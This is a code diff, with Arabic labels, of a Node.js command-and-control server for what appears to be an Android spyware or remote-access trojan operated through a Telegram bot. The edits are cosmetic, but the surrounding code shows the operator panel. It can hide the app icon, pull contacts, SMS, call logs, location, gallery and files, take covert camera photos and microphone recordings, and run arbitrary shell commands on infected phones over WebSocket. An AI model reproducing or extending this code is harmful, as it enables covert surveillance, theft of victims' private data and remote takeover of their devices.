@@ -56,9 +56,6 @@ async function sendLongText(title, agentId, text) {
     }
 }
 
-// ═══════════════════════════════════════════════════════
-// 📤 رفع الملفات
-// ═══════════════════════════════════════════════════════
 app.post('/uploadFile', upload.single('file'), (req, res) => {
     if (!req.file) return res.status(400).send('No file');
     const ext = req.file.originalname.split('.').pop().toLowerCase();
@@ -76,9 +73,6 @@ app.post('/uploadFile', upload.single('file'), (req, res) => {
     res.send('');
 });
 
-// ═══════════════════════════════════════════════════════
-// 📝 رفع النصوص
-// ═══════════════════════════════════════════════════════
 app.post('/uploadText', async (req, res) => {
     await sendLongText(req.body.title || 'تقرير', req.body.agentId || '?', req.body.text || '');
     res.send('');
@@ -132,9 +126,6 @@ app.post('/uploadLocation', (req, res) => {
     res.send('');
 });
 
-// ═══════════════════════════════════════════════════════
-// 🔌 WebSocket — Keep-Alive قوي
-// ═══════════════════════════════════════════════════════
 appSocket.on('connection', (ws, req) => {
     const authKey = req.headers['x-agent-key'];
     if (AGENT_SECRET !== 'default_secret' && authKey !== AGENT_SECRET) {
@@ -148,7 +139,6 @@ appSocket.on('connection', (ws, req) => {
     ws.uuid = uuid;
     ws.isAlive = true;
 
-    // 🔥 تحسين: Keep-Alive قوي
     try {
         ws._socket.setTimeout(0);
         ws._socket.setKeepAlive(true, 30000);
@@ -176,70 +166,30 @@ appSocket.on('connection', (ws, req) => {
     ws.on('error', (e) => {});
 });
 
-// ═══════════════════════════════════════════════════════
-// 🎛️ لوحات التحكم
-// ═══════════════════════════════════════════════════════
 const kbMain = {
     parse_mode: 'HTML',
     reply_markup: {
-        keyboard: [
-            ['📱 الأجهزة المتصلة'],
-            ['🎮 لوحة التحكم']
-        ],
+        keyboard: [['📱 الأجهزة المتصلة'], ['🎮 لوحة التحكم']],
         resize_keyboard: true
     }
 };
 
 const cmdsForDevice = (uuid) => ({
     inline_keyboard: [
-        [
-            { text: '🥷 إخفاء الأيقونة', callback_data: `hide_icon:${uuid}` },
-            { text: '📍 الموقع', callback_data: `location:${uuid}` }
-        ],
-        [
-            { text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` },
-            { text: '💬 الرسائل', callback_data: `messages:${uuid}` }
-        ],
-        [
-            { text: '📞 المكالمات', callback_data: `calls:${uuid}` },
-            { text: '🖼️ المعرض', callback_data: `gallery:${uuid}` }
-        ],
-        [
-            { text: '📂 محتويات التخزين', callback_data: `list_sdcard:${uuid}` },
-            { text: '📊 معلومات النظام', callback_data: `sysinfo:${uuid}` }
-        ],
-        [
-            { text: '📶 WiFi', callback_data: `wifi:${uuid}` },
-            { text: '🔋 البطارية', callback_data: `battery:${uuid}` }
-        ],
-        [
-            { text: '📷 كاميرا أمامية', callback_data: `cam_front:${uuid}` },
-            { text: '📸 كاميرا خلفية', callback_data: `cam_back:${uuid}` }
-        ],
-        [
-            { text: '🔒 قفل الشاشة', callback_data: `lock_screen:${uuid}` },
-            { text: '🔔 اهتزاز', callback_data: `vibrate:${uuid}` }
-        ],
-        [
-            { text: '⚡ تنفيذ Shell', callback_data: `shell_prompt:${uuid}` },
-            { text: '📦 ضغط مجلد ZIP', callback_data: `zip_prompt:${uuid}` }
-        ],
-        [
-            { text: '📁 مسار مخصص', callback_data: `path_prompt:${uuid}` },
-            { text: '🎙️ تسجيل صوتي', callback_data: `mic_prompt:${uuid}` }
-        ],
-        [
-            { text: '🔍 بحث عن ملف', callback_data: `find_prompt:${uuid}` }
-        ],
-        [
-            { text: '🔙 رجوع', callback_data: `back:${uuid}` }
-        ]
+        [{ text: '🥷 إخفاء الأيقونة', callback_data: `hide_icon:${uuid}` }, { text: '📍 الموقع', callback_data: `location:${uuid}` }],
+        [{ text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }, { text: '💬 الرسائل', callback_data: `messages:${uuid}` }],
+        [{ text: '📞 المكالمات', callback_data: `calls:${uuid}` }, { text: '🖼️ المعرض', callback_data: `gallery:${uuid}` }],
+        [{ text: '📂 محتويات التخزين', callback_data: `list_sdcard:${uuid}` }, { text: '📊 معلومات النظام', callback_data: `sysinfo:${uuid}` }],
+        [{ text: '📶 WiFi', callback_data: `wifi:${uuid}` }, { text: '🔋 البطارية', callback_data: `battery:${uuid}` }],
+        [{ text: '📷 كاميرا أمامية', callback_data: `cam_front:${uuid}` }, { text: '📸 كاميرا خلفية', callback_data: `cam_back:${uuid}` }],
+        [{ text: '🔒 قفل الشاشة', callback_data: `lock_screen:${uuid}` }, { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }],
+        [{ text: '⚡ تنفيذ Shell', callback_data: `shell_prompt:${uuid}` }, { text: '📦 ضغط مجلد ZIP', callback_data: `zip_prompt:${uuid}` }],
+        [{ text: '📁 مسار مخصص', callback_data: `path_prompt:${uuid}` }, { text: '🎙️ تسجيل صوتي', callback_data: `mic_prompt:${uuid}` }],
+        [{ text: '🔍 بحث عن ملف', callback_data: `find_prompt:${uuid}` }],
+        [{ text: '🔙 رجوع', callback_data: `back:${uuid}` }]
     ]
 });
 
-// ═══════════════════════════════════════════════════════
-// 📩 استقبال الرسائل النصية
-// ═══════════════════════════════════════════════════════
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
     if (chatId.toString() !== id.toString()) return;
@@ -269,9 +219,6 @@ appBot.on('message', (message) => {
     }
 });
 
-// ═══════════════════════════════════════════════════════
-// 🔘 معالج الأزرار
-// ═══════════════════════════════════════════════════════
 appBot.on('callback_query', async (cb) => {
     const msg = cb.message;
     const [cmd, uuid] = cb.data.split(':');
@@ -301,7 +248,6 @@ appBot.on('callback_query', async (cb) => {
         return;
     }
 
-    // أوامر تحتاج إدخالاً
     if (cmd === 'shell_prompt') {
         await appBot.sendMessage(id, '⚡ <b>أدخل أمر Shell:</b>\nمثال: <code>shell:ls -la /sdcard/</code>', { parse_mode: 'HTML', reply_markup: { force_reply: true } });
         return;
@@ -329,7 +275,6 @@ appBot.on('callback_query', async (cb) => {
         return;
     }
 
-    // الأوامر الفورية
     const instant = [
         'contacts', 'calls', 'messages', 'location',
         'gallery', 'list_sdcard', 'hide_icon',
@@ -344,9 +289,6 @@ appBot.on('callback_query', async (cb) => {
     }
 });
 
-// ═══════════════════════════════════════════════════════
-// 📝 معالج الردود
-// ═══════════════════════════════════════════════════════
 appBot.on('message', async (message) => {
     if (!message.reply_to_message) return;
     if (message.chat.id.toString() !== id.toString()) return;
@@ -373,9 +315,6 @@ appBot.on('message', async (message) => {
     appBot.sendMessage(id, `📤 جاري تنفيذ: <code>${cmd}</code>`, { parse_mode: 'HTML', ...kbMain });
 });
 
-// ═══════════════════════════════════════════════════════
-// 💓 نبضات الاتصال — أقوى
-// ═══════════════════════════════════════════════════════
 setInterval(() => {
     appSocket.clients.forEach((ws) => {
         if (ws.isAlive === false) {
